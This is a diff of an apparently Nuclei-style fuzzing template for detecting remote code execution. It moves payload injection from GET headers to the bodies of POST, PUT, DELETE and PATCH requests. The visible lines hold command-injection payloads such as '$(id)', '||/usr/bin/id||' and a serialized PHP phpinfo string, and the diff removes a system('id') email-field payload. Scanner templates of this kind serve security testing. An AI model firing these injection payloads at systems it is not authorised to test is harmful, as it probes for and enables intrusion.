@@ -1,17 +1,21 @@
-id: rce-header-replace
+id: rce-body-postfix
 
 info:
   name: Remote Code Execution
   author: reewardius
   severity: critical
-  tags: fuzzing-req,fuzzing-req-rce,fuzzing-req-rce-body-query,fuzzing-req-rce-body-query,fuzzing-req-header,dast
+  tags: fuzzing-req,fuzzing-req-rce,fuzzing-req-body-query,fuzzing-req-rce-body-query,fuzzing-req-body,rce,dast
   
 http:
   - pre-condition:
       - type: dsl
         dsl:
-          - 'method == "GET"'
-          
+          - 'method == "POST"'
+          - 'method == "PUT"'
+          - 'method == "DELETE"'
+          - 'method == "PATCH"'
+        condition: or
+        
     payloads:
       rce:
         - "$(id)"
@@ -127,11 +131,10 @@ http:
         - 'fHxgaWRgfHw='
         - 's:19:"<?php phpinfo(); ?>";'
         - '||/usr/bin/id||'
-        - "johnsmith@{{Host}}'.system('id').'"
         
     fuzzing:
-      - part: header
-        type: replace
+      - part: body
+        type: postfix
         mode: single
         fuzz:
           - "{{rce}}"
